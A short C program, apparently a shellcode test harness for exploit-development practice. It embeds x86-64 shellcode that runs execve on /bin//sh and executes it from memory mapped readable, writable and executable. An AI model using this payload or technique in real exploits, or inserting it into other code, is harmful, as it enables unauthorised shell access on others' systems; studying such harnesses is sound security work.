#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

int main() {
  const char shellcode[] =
      "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
      "\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05";

  size_t size = sizeof(shellcode);

  // Allocate memory with RWX permissions
  void *exec_mem = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANON | MAP_PRIVATE, -1, 0);
  if (exec_mem == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  // Copy shellcode into exec_mem
  memcpy(exec_mem, shellcode, size);

  // Execute it
  ((void (*)())exec_mem)();

  return 0;
}
